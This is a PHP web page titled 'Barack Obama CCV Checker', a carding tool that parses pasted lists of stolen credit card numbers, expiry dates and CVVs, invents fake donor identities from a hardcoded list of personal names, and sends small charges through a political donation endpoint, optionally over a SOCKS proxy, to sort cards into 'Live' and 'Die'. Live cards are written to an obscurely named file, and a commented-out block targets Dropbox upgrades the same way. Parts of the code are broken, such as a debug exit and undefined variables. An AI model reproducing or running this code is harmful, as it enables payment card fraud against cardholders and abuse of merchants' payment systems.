<html> 
   <title>--[ CCV Checker]--</title>
   <style>
   body,a{
		background:#000;
		color:#0C0;
		font-family:"Courier New", Courier, monospace;
		font-size:13px;
   }
  textarea,input,select {
		background:#000;
		color:#0C0;
		border:dashed thin #0C0;
  }
  </style>
  
  <body>
  <?php
  @set_time_limit(0);
  
  function _curl($url,$post="",$usecookie = false,$socks=false) {  
	$ch = curl_init();
  
	if($post) {
	curl_setopt($ch, CURLOPT_POST ,1);
	curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
	}
	  
	curl_setopt($ch, CURLOPT_URL, $url); 
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.162 Safari/535.19"); 	  
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);	  
	curl_setopt($ch, CURLOPT_HEADER, $header);	  
	curl_setopt($ch, CURLOPT_NOBODY, $nobody);	  
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip,deflate');	  
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	  
	if ($usecookie) { 	  
		curl_setopt($ch, CURLOPT_COOKIEJAR, $usecookie); 		  
		curl_setopt($ch, CURLOPT_COOKIEFILE, $usecookie);    	  
	} 
       if($socks) { 
                curl_setopt($ch, CURLOPT_PROXY, $socks);
		curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
       }
  
	curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);  
	$result=curl_exec ($ch); 
	curl_close ($ch); 
  
	return $result; 
  }
  
  
  function rand_str($length = 32, $azonly = false) { 
	$hash = sha1(time().microtime());
	$hash .= md5($hash);
	$hash = preg_replace('#[^\w]#i','',strtolower(base64_encode($hash)));
	$hash = substr($hash, 0, $length);
	  
	return $azonly ? preg_replace('#[\d]#','',$hash) : $hash;
  }
  
  function percent($num_amount, $num_total) {
	  $count1 = $num_amount / $num_total; 
	  $count2 = $count1 * 100; 
	  $count = number_format($count2, 0); 
	  return $count; 
  }
  
  function getStr($string,$start,$end){
	$str = explode($start,$string);  
	$str = explode($end,$str[1]); 
	return $str[0];
  }
  
  function phoneType() {
	$phoneType = array( 'Android', 'BlackBerry', 'Symbian', 'Windows', 'Palm Web OS', );
  
	return $userAgent[rand(0,4)];
	}
  
  function checkType($ccnum){
  
	if (substr($ccnum,0,1)==3){	  
		$type = "A";	  
	} elseif (substr($ccnum,0,1)==4){
		$type = "V";
	} elseif (substr($ccnum,0,1)==5){
		$type = "M";
	} elseif (substr($ccnum,0,1)==6){
		$type = "D";
	} else{
		return false;
	}
  
	return $type;
 }
 
 function checkMon($date){
 
	$len = strlen($date);
	 
	if ($len == 1) return $date;
	 
	elseif ($len ==2){
		 
		switch ($date){
			case '01':  $date='1'; break;
			case '02':  $date='2'; break;
			case '03':  $date='3'; break;
			case '04':  $date='4'; break;
			case '05':  $date='5'; break;
			case '06':  $date='6'; break;
			case '07':  $date='7'; break;
			case '08':  $date='8'; break;
			case '09':  $date='9'; break;
			case '10': $date='10'; break;
			case '11': $date='11'; break;
			case '12': $date='12'; break;
		}
	
		return $date; 
	}
 
	else return false;
 }
 
 
 function cutString($source, $begin, $end = '', $trim = false) {
	$element = explode((!$begin ? $end : $begin), $source, 2);	 
	$element[0] = !$begin ? $element[0] : $element[1];
	 
	if($end && $begin) {
		$element = explode($end, $element[1], 2);
	}
	 
	return $trim ? trim($element[0]) : $element[0];
 }
 
 function checkYear($date){
 
	$len = strlen($date);
	 
	if ($len == 4) return $date;	 
	elseif ($len ==2) return '20'.$date;	//{ $date = substr($date,-2); return $date;}	 
	else return false;
 }
 
 function info($ccline){
   $xy = array("|","\\","/","-",";");
   $sepe = $xy[0];
   foreach($xy as $v){
       if (substr_count($ccline,$sepe) < substr_count($ccline,$v)) $sepe = $v;
   }
   $x = explode($sepe,$ccline);

   foreach($xy as $y) $x = str_replace($y,"",str_replace(" ","",$x));
   foreach ($x as $xx){
       $xx = trim($xx);
          if (is_numeric($xx)){
              $yy=strlen($xx);
              switch ($yy){
                  case 15:
                      if (substr($xx,0,1)==3){
                          $ccnum['num'] = $xx;
                          $ccnum['type'] = "american_express";
                     }
                      break;
                  case 16:
                      switch (substr($xx,0,1)){
                           case '4':
                              $ccnum['num']=$xx;
                              $ccnum['type'] = "visa";
                              break;
                         case '5':
                              $ccnum['num']=$xx;
                              $ccnum['type'] = "mastercard";
                              break;
                         case '6':	
							$ccnum['num']=$xx;	
							$ccnum['type'] = "discover";	
							break;
                      }
                      break;
                  case 1:
                      if (($xx >= 1) and ($xx <=12) and (!isset($ccnum['mon']))) $ccnum['mon'] = $xx;
                  case 2:
                      if (($xx >= 1) and ($xx <=12) and (!isset($ccnum['mon'])))    $ccnum['mon'] = $xx;
                      elseif (($xx >= 11) and ($xx <= 19) and (isset($ccnum['mon'])) and (!isset($ccnum['year'])))    $ccnum['year'] = "20".$xx;
                      break;
                  case 4:
                      if (($xx >= 2011) and ($xx <= 2019) and (isset($ccnum['mon'])))    $ccnum['year'] = $xx;
                      elseif ((substr($xx,0,2) >= 1) and (substr($xx,0,2) <=12) and (substr($xx,2,2)>= 11) and (substr($xx,2,2) <= 19) and (!isset($ccnum['mon'])) and (!isset($ccnum['year']))){
                              $ccnum['mon'] = substr($xx,0,2);
                              $ccnum['year'] = "20".substr($xx,2,2);
                          }
                      else $ccv['cv4'] = $xx;
                      break;
                  case 6:
                      if ((substr($xx,0,2) >= 1) and (substr($xx,0,2) <=12) and (substr($xx,2,4)>= 2011) and (substr($xx,2,4) <= 2019)){
                         $ccnum['mon'] = substr($xx,0,2);
                         $ccnum['year'] = substr($xx,2,4);
                     }
                     break;
                 case 3:
                     $ccv['cv3'] = $xx;
                     break;
 
               }
           }
           }
     if (isset($ccnum['num']) and isset($ccnum['mon']) and isset($ccnum['year'])){
             if ($ccnum['type'] == "AMEX") $ccnum['cvv'] = $ccv['cv4'];
             else $ccnum['cvv'] = $ccv['cv3'];
         return $ccnum;
     }
     else return false;
 }
 
 function rand_acc(){
 
	$acc = Array();
 
	 $acc[] = "Carl||Piacenza";
	 $acc[] = "Phillip||Gibson";
	 $acc[] = "Tore||Paulsrud";
	 $acc[] = "Stephen||Booty";
	 $acc[] = "Deborah||Modert";
	 $acc[] = "Claes-Olov||Bjurholm";
	 $acc[] = "Helge||Olsen";
	 $acc[] = "Lisa||I Tetreault";
	 $acc[] = "Shu||Hwa Yung";
	 $acc[] = "Bret||Olson";
	 $acc[] = "Callan||Suvaljko";
	 $acc[] = "Paula||F Dickinson";
	 $acc[] = "Angela||Lewis";
	 $acc[] = "Mohd||Alias Ibrahim";
	 $acc[] = "Sandra||Green";
	 $acc[] = "Robert||Lowrey";
	 $acc[] = "Alistair||Darling";
	 $acc[] = "Jianqi||He";
	 $acc[] = "Fletcher||Watson";
	 $acc[] = "Cathrine||Asheim";
	 $acc[] = "Rizvi||Yoosoofsah";
	 $acc[] = "Larry||Durham";
	 $acc[] = "Michael||Alvaro";
	 $acc[] = "Asgeir||Borgemoen";
	 $acc[] = "Siew||Lian Chua";
	 $acc[] = "Peter||Rajczi";
	 $acc[] = "Terence||Hagstrom";
	 $acc[] = "Kathleen||Brownless";
	 $acc[] = "Heather||Mate";
	 $acc[] = "Tor||Erik Fjeldstad";
	 $acc[] = "Ron||Brooks";
	 $acc[] = "Christopher||Manny";
	 $acc[] = "Anne-Marie||Todd";
	 $acc[] = "Kerry||Grills";
	 $acc[] = "Wanda||A Howlett";
 
	$ran = array_rand($acc);
 
	return explode("||", $acc[$ran]);
 }
 
 if ($_POST['cclist']){
	global $cookie;
	$cookie = tempnam('cookie','ggco'.rand(1000000,9999999).'ltb123.txt');
	$cclive = "";
	$ccdie = "";
	$ccerr = "";
	$cccant = "";
	$uncheck = "";
	$cclist = trim($_POST['cclist']); 
	$cclist = str_replace(array("\\\"","\\'"),array("\"","'"),$cclist); 
	$cclist = str_replace("\n\n","\n",$cclist); 
	$cclist = explode("\n",$cclist);
	$Socks = trim($_POST['socks']);
	$STT = 0;
	$TOTAL = count($cclist);
 
	for($i=0;$i<count($cclist);$i++){
		$ccnum = info($cclist[$i]);
		$type = $ccnum['type'];
		$ccn = $ccnum['num'];
		$ccmon = checkMon($ccnum['mon']);
		$ccyear = $ccnum['year'];
		$cvv = $ccnum['cvv'];
		
		$cc_number = substr($ccn,0,4).'XXXXXXXX'.substr($ccn,12,4);
		//$count_user=get_credit($user);
		 
		//if ($count_user>1)
			if ($ccn){
				$STT++;
				
				if($C_C > '0'){$cvv = '';}
				
				$email = rand_str(7).'@'.'msn.com';
				$usename = rand_str(7);
				$pass = rand_str(9);
				$addr1 = rand_str(9);
				$addr2 = rand_str(9);
				$city = rand_str(5);
				
				$phone = rand(100000000000, 999999999999); 
				
				$ran_url = rand_acc();
				$fname = $ran_url[0];
				$lname = $ran_url[1];
				
				/*
				$url = "https://www.dropbox.com/register?";
				$post= "cont=https%3A%2F%2Fwww.dropbox.com%2Faccount&fname=$fname&lname=$lname&email=$email&password=$pass&tos_agree=on&register-submit=Create+account";
				$s = _curl($url,$post,$cookie);
				 
				$url = "https://www.dropbox.com/upgrade";
				$s = _curl($url,"",$cookie);
				$token = urlencode(cutString($s, 'name="t" value="', '"'));
				 
				$url = "https://www.dropbox.com/upgrade";
				$post= "t=$token&plan=100&period=month&ccn=$ccn&name=$fname+$lname&ccode=$cvv&expmo=$ccmon&expyr=$ccyear&address=1155+Warburton+Avenue+Apt+12T&city=Yonkers&state=NY&zip=10701&country_code=US&submitted_cc=true";
				$s = _curl($url,$post,$cookie);
				*/
				
				$url = "https://donate.barackobama.com/page/cde/Contribution/Charge";
				$post= "slug=o2013-ofaction&submission_key=H5cKEL6LKc3SoqcSQMkeiLD9gWEKJahL&http_referer=&event_attendee_id=&outreach_page_id=&stg_signup_id=&mailing_link_id=&mailing_recipient_id=&match_campaign_id=&match_is_pledge=&pledge_is_convert=&contributor_key=&quick_donate_populated=0&device_fingerprint=a27b9218c41cd9f4687310ea6103ca80&country=US&cc_number_ack=$ccn&ach_account_number_ack=&firstname=$fname&lastname=$lname&addr1=$addr1&addr2=$addr2&city=$city&state_cd=AR&zip=11000&email=$email&phone=$phone&amount=other&amount_other=3&cc_type_cd=vs&cc_number=$cc_number&cc_expir_month=$ccmon&cc_expir_year=$ccyear&ach_routing_number=&ach_account_number=&ach_account_name=&recurring_acknowledge=1&bestcontacttime=&cvv=&issue_number=&goback_action=1";
				$s = _curl($url,$post,$cookie);
				
		var_dump($s);exit;		 
				if(stristr($s,'The\x20transaction\x20resulted\x20in\x20an\x20AVS\x20mismatch\x2e\x20The\x20address\x20provided\x20does\x20not\x20match\x20billing\x20address\x20of\x20cardholder\x2e')){
					echo "$STT/$TOTAL | Credit:<font color=green><b> " .$count_user." </b></font> - <font color=blue><b>Live ==> | </font></b>".$cclist[$i]. " - Checked by UgPro.Org<br>"; $cclive .= $cclist[$i]."\n";
					$path="vaz112364343523gsd24hdflionkings-ccv.html"; $file=fopen($path, "a"); $write=fwrite($file,$cclive."</br>"); fclose($file);
				} elseif(stristr($s,'This\x20transaction\x20has\x20been\x20declined\x2e')){
					echo "$STT/$TOTAL | Credit:<font color=green><b> " .$count_user." </b></font> - <font color=red><b>Die ==> | </font></b>".$cclist[$i]." - Checked by UgPro.Org<br>"; $ccdie .= $cclist[$i]."\n";
				} else {
					echo "$STT/$TOTAL | <font color=orange><b>CantCheck ==> | </font></b>".$cclist[$i]." - Checked <br>"; $cccant .= $cclist[$i]."\n";
				}
				flush();
			}		 
	}
 
	unlink($cookie);

	$per0 = percent(count(explode("\n",$cclive1))-1,count($cclist));
	$per1 = percent(count(explode("\n",$cclive))-1,count($cclist));
	$per2 = percent(count(explode("\n",$ccdie))-1,count($cclist));
	$per3 = percent(count(explode("\n",$ccerr))-1,count($cclist));
	$per4 = percent(count(explode("\n",$cccant))-1,count($cclist));
	$per5 = percent(count(explode("\n",$uncheck))-1,count($cclist));
 
	echo "<center><a href='ccv_checker.php'>Click Here to Continue</a><br>";
 
	if($cclive!=""){
		echo "<h2><font color=blue>Live</font> $per1 % (".(count(explode("\n",$cclive))-1)."/".count($cclist).")</h2>";
		echo "<textarea cols=120 rows=10>$cclive</textarea><br>";
	}
	
	if($cclive1!=""){
		 echo "<h2><font color=blue>Live</font> $per1 % (".(count(explode("\n",$cclive1))-1)."/".count($cclist).")</h2>";
		 echo "<textarea cols=120 rows=10>$cclive1</textarea><br>";
	}
 
	if($ccdie!=""){
		 echo "<h2><font color=red>Die</font> $per2 % (".(count(explode("\n",$ccdie))-1)."/".count($cclist).")</h2>";
		 echo "<textarea cols=120 rows=10>$ccdie</textarea><br>";	 
	}
 
	if($ccerr!=""){
		 echo "<h2><font color=orange>Error</font> $per3 % (".(count(explode("\n",$ccerr))-1)."/".count($cclist).")</h2>";
		 echo "<textarea cols=120 rows=10>$ccerr</textarea><br>";
	}
 
	if($cccant!=""){
		 echo "<h2><font color=green>CantCheck</font> $per4 % (".(count(explode("\n",$cccant))-1)."/".count($cclist).")</h2>";
		 echo "<textarea cols=120 rows=10>$cccant</textarea><br>";
	}
 
	if($uncheck!=""){
		 echo "<h2><font color=green>UnCheck</font> $per5 % (".(count(explode("\n",$uncheck))-1)."/".count($cclist).")</h2>";
		 echo "<textarea cols=120 rows=10>$uncheck</textarea><br>";
	}
 } else {
 ?> 
 
 <section class="container_6 clearfix" id="main"><center><h3>Barack Obama CCV Checker<h3>
 <p> <font color=red>No Change</font> / Visa-MasterCard-Amex / Country: All</font></p>
 <form action="" method=post name=f> 
	<textarea name=cclist style="width:90%" rows=15></textarea><br><br>
	<input type=submit name=submit class="button button-gray" value="Check Now">
 </form> 
<?php }?>
	</div>
</section>
<!-- Main Section End -->
 
        </div>
     </footer>
  </body>
</html>